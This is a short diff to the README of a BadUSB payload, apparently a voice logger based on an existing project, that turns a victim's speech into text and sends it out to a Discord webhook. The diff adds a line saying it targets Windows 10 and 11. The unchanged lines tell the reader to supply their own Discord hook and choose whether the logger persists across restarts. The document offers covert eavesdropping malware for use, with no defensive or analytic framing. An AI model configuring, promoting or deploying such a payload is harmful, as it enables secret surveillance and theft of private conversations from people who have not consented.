@@ -3,6 +3,8 @@
 This payload exfills user voice as text to Discord.
 Based on I'm Jackoby [VoiceLogger](https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/7f4899b95e2d0ad9457de2a07c9cb60733e24778/Payloads/VoiceLogger)
 
+**It targets Windows 10, 11**
+
 You must edit the following parameters on the payload:
 * Hook - your Discord hook
 * Persistent - Must be $true or $false. Indicates whether or not the voicelogger persist between restarts.
